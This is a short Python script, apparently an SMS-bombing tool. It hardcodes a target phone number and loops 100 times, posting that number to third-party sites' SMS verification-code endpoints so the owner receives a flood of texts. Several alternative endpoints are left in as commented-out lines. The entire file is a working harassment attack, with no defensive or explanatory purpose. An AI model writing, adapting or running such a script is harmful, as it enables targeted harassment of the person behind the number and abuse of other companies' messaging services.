import requests
import time

tel = '18234837162'
# 请求数据
s = 100


# 轰炸次数

def geturl(url, data):
    r = requests.get(url=url, params=data)
    print(r.status_code)
    time.sleep(1)


def posturl(url, data):
    r = requests.post(url=url, data=data)
    print(r.status_code)
    # 发送post请求
    time.sleep(1)


def attack():
    # posturl('http://www.rewenwen.com/mport.php', {'phone': tel, 'action': 'send_vertify_code', 'type': 'login_phone'})
    # geturl('http://www.wukamao.xyz/api/sms/sendSms', {'phone': tel})
    # posturl('http://api.rnhapp.cn/huotui/sms/send',
    #         {'s': '24efb2bcf01e5006731bb09224034d7c', 'osv': 'android27', 't': '1535788941814', 'pinfo': 'MI+8',
    #          'v': '1.0.0', 'f': 'Android', 'mobile': tel, 'guid': '61bc68219a335b970b4b677ae2e4ddbf', 'type': '0'})
    posturl('http://dev.redapp.longu.xyz/data/user_api/ApiGetVerifyCode.php', {'account': tel, 'type': '1'})


if __name__ == '__main__':
    for i in range(s):
        attack()
        time.sleep(10)
